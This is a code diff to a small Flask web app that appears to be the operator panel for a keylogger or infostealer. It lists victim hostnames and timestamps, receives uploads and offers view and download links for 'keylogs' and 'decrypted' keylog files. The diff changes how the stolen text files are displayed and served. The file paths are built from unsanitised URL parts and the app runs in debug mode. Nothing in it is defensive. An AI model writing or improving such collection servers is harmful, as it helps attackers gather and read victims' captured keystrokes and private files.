@@ -1,5 +1,5 @@
 import os
-from flask import Flask, request, send_from_directory, render_template_string, abort
+from flask import Flask, request, send_from_directory, render_template_string, Response
 from werkzeug.utils import secure_filename
 from datetime import datetime
 import pytz
@@ -51,11 +51,11 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for i, file in enumerate(folder.files) %}
+          {% for file in folder.files %}
             <td>
               {% if file %}
-                {% if i == 3 or i == 4 %} <!-- Keylogs or Decoded Keylogs -->
-                  <a href="{{ file.replace('/download', '/view') }}" target="_blank">📄 View</a>
+                {% if file.endswith('.txt') and ('keylogs' in file or 'decrypted' in file) %}
+                  <a href="{{ file.replace('/download', '/view') }}" target="_blank">👁️ View</a>
                 {% else %}
                   <a href="{{ file }}" target="_blank">📥 View/Download</a>
                 {% endif %}
@@ -142,19 +142,16 @@ def receive():
 
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
-    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename, as_attachment=True)
+    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
 
 @app.route("/view/<folder>/<filename>")
-def view_text(folder, filename):
-    path = os.path.join(UPLOAD_ROOT, folder, filename)
-    if not os.path.exists(path):
-        return abort(404)
+def view_file(folder, filename):
     try:
-        with open(path, "r", encoding="utf-8") as f:
+        with open(os.path.join(UPLOAD_ROOT, folder, filename), "r", encoding="utf-8") as f:
             content = f.read()
-        return f"<pre style='background:black; color:lime; font-family:monospace; padding:20px;'>{content}</pre>"
+        return Response(content, mimetype='text/plain')
     except:
-        return abort(500)
+        return "Error reading file"
 
 if __name__ == "__main__":
     app.run(debug=True)
